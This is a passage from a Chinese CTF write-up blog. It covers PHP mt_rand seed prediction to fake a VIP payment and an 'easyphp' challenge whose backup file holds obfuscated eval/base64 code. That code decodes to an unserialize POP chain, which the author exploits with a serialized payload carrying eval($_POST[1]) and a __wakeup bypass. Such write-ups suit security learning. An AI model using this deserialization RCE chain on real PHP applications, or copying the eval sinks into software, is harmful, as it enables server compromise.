<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">666666</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">mt_rand</span>();<span class="comment">//   == 1567320364</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703589477-a8c106a6-f98e-4355-af20-24500bc07df8.png#averageHue=%23e6bf7e&clientId=ucecd0ee9-26fc-4&from=paste&height=137&id=u71d42001&name=image.png&originHeight=171&originWidth=693&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9989&status=done&style=none&taskId=u64a57561-fe82-4d87-9f34-0a2c603937c&title=&width=554.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703633830-b06ded1f-915c-4e6d-b987-e6ac474a3467.png#averageHue=%23e5e6e5&clientId=ucecd0ee9-26fc-4&from=paste&height=252&id=u010bbe46&name=image.png&originHeight=315&originWidth=560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83908&status=done&style=none&taskId=uac8853fa-b1ba-4fe2-8a0a-99882fc6b98&title=&width=448" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703657920-c856ab57-5d66-4637-869a-08a93d681711.png#averageHue=%237d929c&clientId=ucecd0ee9-26fc-4&from=paste&height=604&id=u73989edf&name=image.png&originHeight=755&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=609970&status=done&style=none&taskId=ua0ac9b6e-6fc6-4db0-9924-e11394ce4e1&title=&width=1536" alt="image.png"><br>到账了到账了，最后就差个vip了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703668814-7f42c7af-2117-4e20-8453-0d928f622f09.png#averageHue=%23f6f5f5&clientId=ucecd0ee9-26fc-4&from=paste&height=60&id=uac26597b&name=image.png&originHeight=75&originWidth=441&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2768&status=done&style=none&taskId=uf55c281d-fe6a-414a-babd-b2a9a31e29d&title=&width=352.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703680684-1018239e-b738-4860-b7f1-83f8ad007cfe.png#averageHue=%23d9c4ab&clientId=ucecd0ee9-26fc-4&from=paste&height=116&id=u12c78ee2&name=image.png&originHeight=145&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10230&status=done&style=none&taskId=u8a47228d-6e40-41ec-99de-3a9a0e9eff0&title=&width=667.2" alt="image.png"><br>看得出来是给人开VIP的，一样的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703714392-223b73b8-4241-40df-9671-7b9afd288009.png#averageHue=%23dadddd&clientId=ucecd0ee9-26fc-4&from=paste&height=334&id=u6ecc4d6e&name=image.png&originHeight=418&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151579&status=done&style=none&taskId=u3d82a0f3-5c3f-4df2-a5c8-954cc89fa2b&title=&width=694.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703755567-6e770921-a37e-4ce5-ab07-bde73ec531e6.png#averageHue=%23b2c7b6&clientId=ucecd0ee9-26fc-4&from=paste&height=226&id=u72f0dd4c&name=image.png&originHeight=282&originWidth=976&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143132&status=done&style=none&taskId=uc62fa3b3-d6e6-468c-9347-285292cf0a5&title=&width=780.8" alt="image.png"><br>我是贵宾了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703770362-df033d1b-4db1-476a-9dc8-483644923374.png#averageHue=%23e7e4e1&clientId=ucecd0ee9-26fc-4&from=paste&height=96&id=u30006fbc&name=image.png&originHeight=120&originWidth=846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32504&status=done&style=none&taskId=uc272f280-8474-4d2c-b786-cb1d70d41bb&title=&width=676.8" alt="image.png"></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668703804853-ff461d35-1bf9-487c-896a-44a37b93fdeb.png#averageHue=%23f9f9f9&clientId=ucecd0ee9-26fc-4&from=paste&height=117&id=ua5c4bc37&name=image.png&originHeight=146&originWidth=483&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4674&status=done&style=none&taskId=ub432ae71-497e-4670-99b5-44b3fc4a7cc&title=&width=386.4" alt="image.png"><br>空白一片，但是有backup：<br>发现是<code>index.php.bak</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$O00OO0</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<span class="variable">$O00O0O</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$O0OO00</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$OO0O00</span>=<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;    </span><br><span class="line">        .<span class="variable">$O0OO00</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$OO0000</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$O00O0O</span>.=<span class="variable">$O00OO0</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">36</span>&#125;    </span><br><span class="line">        .<span class="variable">$O00OO0</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;    </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$O00O0O</span>(<span class="string">&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现了一大串什么不得了的东西：<br>中间eval内的base64解密下来是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$O0O000</span>=<span class="string">&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;</span>;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.<span class="variable">$O00O0O</span>(<span class="variable">$O0OO00</span>(<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>*<span class="number">2</span>),<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>,<span class="variable">$OO0000</span>),    </span><br><span class="line">        <span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="number">0</span>,<span class="variable">$OO0000</span>))));</span><br></pre></td></tr></table></figure>
<p>重要的东西是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$O00O0O</span>(<span class="variable">$O0OO00</span>(<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>*<span class="number">2</span>),<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>,<span class="variable">$OO0000</span>),    </span><br><span class="line">        <span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="number">0</span>,<span class="variable">$OO0000</span>)))</span><br></pre></td></tr></table></figure>
<p>这一串byd的东西，我们本地调试看看这一串是什么：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$O00OO0</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<span class="variable">$O00O0O</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$O0OO00</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$OO0O00</span>=<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;    </span><br><span class="line">       .<span class="variable">$O0OO00</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$OO0000</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$O00O0O</span>.=<span class="variable">$O00OO0</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">36</span>&#125;    </span><br><span class="line">       .<span class="variable">$O00OO0</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;    </span><br><span class="line">       <span class="title function_ invoke__">var_dump</span>(<span class="variable">$O00O0O</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$OO0O00</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$OO0000</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$O0OO00</span>);</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable">$O00O0O</span>(<span class="string">&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;</span>));</span><br><span class="line">        <span class="variable">$O0O000</span>=<span class="string">&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$O0OO00</span>(<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>*<span class="number">2</span>),<span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="variable">$OO0000</span>,<span class="variable">$OO0000</span>),    </span><br><span class="line">       <span class="variable">$OO0O00</span>(<span class="variable">$O0O000</span>,<span class="number">0</span>,<span class="variable">$OO0000</span>)));  </span><br><span class="line"></span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704346346-c70903f9-4ca3-4b5d-8e3c-939aa20ce015.png#averageHue=%23f7f5f3&clientId=ucecd0ee9-26fc-4&from=paste&height=116&id=u4099337d&name=image.png&originHeight=145&originWidth=1344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16971&status=done&style=none&taskId=u16d2ac51-a40a-4cc2-9d83-7993146bec6&title=&width=1075.2" alt="image.png"><br>得到了一串base64：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BillyHerrington</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; a = <span class="string">&quot;fxxk you &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; a.<span class="string">&quot;Wow&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baoglady</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; b -&gt; <span class="title function_ invoke__">happy</span>(<span class="variable">$this</span> -&gt; c);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VanDarkholme</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;str&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>什么?解出来居然是一个反序列化的，纳尼？你喜欢套娃是吗</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BillyHerrington</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;a=<span class="keyword">new</span> <span class="title class_">Baoglady</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baoglady</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$c</span>=<span class="string">&#x27;eva($_POST[1]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;b=<span class="keyword">new</span> <span class="title class_">VanDarkholme</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VanDarkholme</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">BillyHerrington</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>POP链就是如上所示了，逻辑浅显易懂无脑<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668704631538-5862fcef-a913-4d43-99c7-1a4bb5793202.png#averageHue=%237d7c7c&clientId=ucecd0ee9-26fc-4&from=paste&height=704&id=u4ea516c9&name=image.png&originHeight=880&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100178&status=done&style=none&taskId=u6d28c4ac-43bc-4aab-98e5-433c0100b50&title=&width=1026.4" alt="image.png"><br>记得改一下属性绕过wakeup，就这样rce了，我有啥好说的</p>
